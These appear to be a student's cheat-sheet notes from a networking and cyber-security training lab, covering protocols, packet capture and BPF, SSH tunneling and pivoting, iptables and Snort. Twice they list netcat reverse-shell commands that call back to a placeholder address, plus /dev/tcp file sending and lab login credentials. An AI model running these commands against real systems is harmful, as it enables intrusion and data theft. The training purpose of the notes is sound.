# INFO
http://networking-ctfd-1.server.vta:8000/resources
DYMI-003-M

Google the Protocol RFC's

https://miro.com/app/board/o9J_klSqCSY=/

Student#: student9
Command: ssh student@10.50.39.61 -X
Password: password

IANA - RFC

---------------------------------------------------------------------------------------------------------------
# Layer 2
Mac Addr converter
Arp Poisioning 
Mac Spoofing 
Double tagging

EtherType 0x0800 - ipv4
          0x08DD - ipv6
          0x0806 - ARP
          0x8000 - Vlan Tag
          0x88A8 - Standard Double Tag
          0x9100 - Non-standard Double Tag
## Layer 2 Switching
Cisco Discovery Protocol (CDP)
Foundry Discovery Protocol (FDP)
Link Layer Discovery Protocol(LLDP)

PORT SECURITY
    -shutdown
    -restrict
    -protect







# Layer 3
TTL - Hop Limit
Protocol - Next Header
TTL-
     Linux   -64
     Windows -128
     Cisco   -255

IPv4 Auto Configuration
  - APIPA
  - RFC 3927
IPv6 auto configuration
  - SLAAC (StateLess Address Auto-configuration)
  - RFC 4862


## Layer 3 routing
Show ip route



# Layer 4
TCP FLAGS
          URG
          ACK
          PSH
          RST
          SYN
          FYN

# Layer 5
SOCKS 4/5 (TCP 1080)
PPTP (TCP 1723)
L2TP (TCP 1701)
SMB/CIFS (TCP 139/445 and UDP 137/138)

# Layer 6
Responsibilities
          Translation
          Formating
          Encoding (ASCII, EBCDIC, HEX, BASE64)
          Encryption (Symmetric or Asymmetric)
          Compression
          
# Layer 7
FTP (TCP 20/21)
SSH (TCP 22)
Telnet (TCP 23)
SMTP (TCP 25)
TACACS (TCP 49) Simple/Extended
HTTP(s) (TCP 80/443)
POP (TCP 110)
IMAP (TCP 143)
RDP (TCP 3389)
DNS (query/response) (TCP/UDP 53)
DHCP (UDP 67/68)
TFTP (UDP 69)
NTP (UDP 123)
SNMP (UDP 161/162)
RADIUS (UDP 1645/1646 and 1812/1813)
RTP (UDP any above 1023)



# Cap
sudo tcpdump -D
sudo tcpdump -XXvv --hex and ascii and verbose {-w} some.pcap 
sudo tcpdump -r some.pcap --read pcap
sudo tcpdump port 80 || 22


# BPF
tcpdump {A} [B:C] {D} {E} {F} {G}

        A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
        B = Header Byte offset
        C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
        D = optional: Bitwise mask (&)
        E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
        F = Result of Expresion
        G = optional: Logical Operator (&& ||) to bridge expressions

Example:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

Bitwise Masking
    To filter down to the bit(s) and not just the byte.
ip[0] & 0x0F > 0x05

sudo tcpdump 'ip[8] <= 64 || ip6[7] <= 64' -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l


# Network Programming
socket.socket([*family*[,*type*[*proto*]]])

    family constants should be: AF_INET (default), AF_INET6, AF_UNIX

    type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW

    proto constants should be: 0 (default), IPPROTO_RAW



# Recon
WHOIS - Domain name to Ip & Info

**Key Ports* 
nmap -Pn 10.10.0.40 -p 21,22,23,80

NetCat for banner grabbing!!!

ip neigh | grep REACH -- finding local machines

**getting webpages//files**
curl 
wget -r~recursive
ftp

# router commands 
show int 


# Data Transfer 
### TFTP
          -UDP
          -small
          -insecure
          -no terminal communication
          
### FTP
          -TCP
          -control 21 Data 20
          -insecure by default
          -has dir services
          -anonymous login

### SFTP             
          -TCP 22
          -ftp + ssh
          -terminal
          
### FTPS
          -TCP 443
          -adds SSL/TLS
          -teminal
'''
nc 10.50.30.212 21 **banner grab**
          ftp 10.50.30.212
                    Anonymous
          Passive
          **if not working, possibly using public ip so data channel is built to the middle man**
          **May be useful for bypassing firewalls**
'''
 ### remember wget! wget -r ftp://10.0.0.104 ---specify port
 
 
### SCP
          -tcp 22   Uses -P to specify alt port
          -non interactive
          
          Download from remote to local
 scp student@172.16.82.106:secretstuff.txt /home/student        
          Upload to remote from local
  scp secretstuff.txt student@172.16.82.106:/home/student        
          copy from remote to remote                                  **-3 uses me as the middle man**
    scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student      

          **TUNNEL**
ssh student@172.16.82.106 -L 1111:localhost:22 -NT

          Download from remote to local
scp -P 1111 student@localhost:secretstuff.txt /home/student

          Upload to remote from local
scp -P 1111 secretstuff.txt student@localhost:/home/student          


### Netcat
          Client to listener
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

          Listener to Client
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
nc -l -p 9002 < infile.txt
nc -l -p 9001 > outfile.txt

          Useful if host doesnt have netcat
nc -l -p 1111 > file.txt

cat file.txt > /dev/tcp/10.2.0.2/1111

          **Reverse shell using NETCAT**
          When shelled into the remote host using -c :

nc -c /bin/sh <your ip> <any unfiltered port>

          You could even pipe BASH through NETCAT.

/bin/sh | nc <your ip> <any unfiltered port>

          Then listen for the shell.

nc -l -p <same unfiltered port> -vvv

          You can also listen using the -e with NETCAT.

nc -l -p <any unfiltered port> -e /bin/bash


## Pipes 
mkfifo APIPE          **three seprate machines**
nc -lp 3334 > APIPE | nc 10.50.34.84 12009 < APIPE
nc 10.0.0.101 3334 < newsecret.file
nc -lp 12009 

          
### EXAMP
nc -lp 1234 > piper | nc 10.50.39.61 5432 < piper         
nc 172.16.82.115 9876 > piper | nc 10.50.39.61 5432 < piper
>                                                           
                                                           
 #### Traffic Redirection
NetCat / nc

Client to Listener File Transfer:
	Client (sends file): nc 10.2.0.2 9001 < file.txt
	Listener (receive file): nc -l -p 9001 > newfile.tx

Listener to Client file transfer
	Listener (sends file): nc -l -p 9001 < file.txt
	Client (receive file): nc 10.2.0.2 9001 > newfile.txt

netstat -antp to see ports

NetCat Relay:
		mknod mypipe p									Makes pipe
		nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe			Redirect standard input into 9002, 
	On Listener2 (sends info):
		nc -l -p 9002 < infile.txt
	On Listener1 (receives info):
		nc -l -p 9001 > outfile.txt

		Writes the output to listener1 and l
         listener2 through the named pipe
		
File Transfer with /dev/tcp
	On the receiving box:
		nc -l -p 1111 > file.txt
	On the sending box:
		cat file.txt > /dev/tcp/10.2.0.2/1111
		This method is useful for host that does not have NETCAT available.		
		

Reverse shell using NETCAT:
	When shelled into the remote host using -c :
		nc -c /bin/sh <your ip> <any unfiltered port>
	You could even pipe BASH through NETCAT.
		/bin/sh | nc <your ip> <any unfiltered port>
	Then listen for the shell:
		nc -l -p <same unfiltered port> -vvv
	You can also listen using the -e with NETCAT.
		nc -l -p <any unfiltered port> -e /bin/bash


#### Tunneling
SSH v1 v2
sftp - FTP over ssh

SSH Port Forwarding: 
	Allows for tunneling of other services through SSH

	ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
	or
	ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
          
ssh net1_student9@10.50.30.255 -L 10900:10.1.1.11:23 -NT

Dynamic Port Forwarding:
	ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
	Proxychains default port is 9050
Example:
	ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
	ssh student@localhost -D 9050 -p 1111 -NT
	proxychains curl ftp://www.onlineftp.ch
	proxychains wget -r www.espn.com
	proxychains ./scan.sh
	proxychains nmap

SSH Remote Port Forwarding:
	ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
	or
	ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

	clarence:	ssh jim@jim-ip -R 1199:localhost:22
	Me:		ssh -p 1115 jim@localhost -L 1117:localhost:1199
	Me:		ssh -p 1117 clarence@localhost
          
ssh net1_student9@10.2.2.6 -R 10999:localhost:2222
          
Covert Channels:
	Other protocols can be pulled through these tunnels
	DNS
	ICMP
	HTTP


-----------------------------------------------------------------------------------------
## Network Analysis
-----------------------------------------------------------------------------------------
#### Fingerprinting and Host Identification
Passive:
	TTL
	Default IP Header Length
	Window Size
	TCP options
	ICMP data

/etc/p0f/p0f.fp
	sudo p0f -r wget-pcp -o /var/log/p0f.log
	sudo cat -n p0f.log | grep "mod=syn" | grep "subj=cli" | grep "srv=10.50.25.35/80"
read pcaps for os, application version


-----------------------------------------------------------------------------------------
## IP Tables and NAT
-----------------------------------------------------------------------------------------
#### 
Filtering Concepts
    Whitelist vs Blacklist
    Default policies and Implicit and Explicit rules
    Network Device Operation Modes
        Routed
        Transparent

Traffic Directions
    1. Traffic originating from the localhost to the remote-host
    2. Return traffic from that remote-host back to the localhost.
    3. Traffic originating from the remote-host to the localhost
    4. Return traffic from the localhost back to the remote-host.


Netfilter paradigm
    tables - contain chains
    chains - contain rules
    rules  - dictate what to match and what actions to perform on packets when packets match a rule



#### IPTables
    filter - default table. Provides packet filtering.
        INPUT, FORWARD, and OUTPUT
        
    nat - used to translate private ←→ public address and ports.
        PREROUTING, POSTROUTING, and OUTPUT
        
    mangle - provides special packet alteration. Can modify various fields header fields.
        All Chains: PREROUTING, POSTROUTING, INPUT, FORWARD and OUTPUT.
        
    raw - used to configure exemptions from connection tracking.
        PREROUTING and OUTPUT
        
    security - used for Mandatory Access Control (MAC) networking rules.
        INPUT, FORWARD, and OUTPUT


#### NFTables
inet - IPv4 and IPv6 packets

There are three chain types:
    filter - to filter packets - can be used with arp, bridge, ip, ip6, and inet families
    route  - to reroute packets - can be used with ip and ipv6 families only
    nat    - used for Network Address Translation - used with ip and ip6 table families only

Hooks:
PREROUTING
POSTROUTING
INPUT
OUTPUT
FORWARD not work with nat



-----------------------------------------------------------------------------------------
## Signatures and ACL placement
-----------------------------------------------------------------------------------------
Snort Rules:
[action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)
    Action - such as alert, log, pass, drop, reject
    Protocol 			- includes TCP, UDP, ICMP and others
    Source IP address 		- single address, CIDR notation, range, or any
    Source Port 		- one, multiple, any, or range of ports
    Direction		 	- either inbound or in and outbound
    Destination IP address 	- options mirror Source IP
    Destination port 		- options mirror Source port

IDS/IPS fails/breaks
Fail open
	Defaults to open all traffic
Fail close
	Defaults to close all traffic
                                                          
                                                           
                                                           
                                                           
                                                          
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
                                                           
